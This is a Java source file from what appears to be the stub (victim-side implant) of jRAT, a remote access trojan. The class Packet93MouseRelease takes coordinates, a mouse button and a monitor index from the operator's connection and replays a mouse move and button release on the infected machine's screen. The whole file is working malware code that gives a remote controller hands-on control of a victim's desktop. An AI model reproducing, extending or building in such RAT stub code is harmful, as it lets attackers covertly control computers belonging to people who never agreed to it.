package io.jrat.stub.packets.incoming;

import io.jrat.common.utils.Utils;
import io.jrat.stub.Connection;
import io.jrat.stub.utils.ScreenUtils;

public class Packet93MouseRelease extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int x = con.readInt();
		int y = con.readInt();
		int btn = con.readInt();
		int monitor = con.readInt();
		
		if (!Utils.isHeadless()) {
			if (monitor == -1) {
				ScreenUtils.getDefault().mouseMove(x, y);
				ScreenUtils.getDefault().mouseRelease(btn);
			} else {
				ScreenUtils.getAllRobots()[monitor].mouseMove(x, y);
				ScreenUtils.getAllRobots()[monitor].mouseRelease(btn);
			}
		}
	}

}
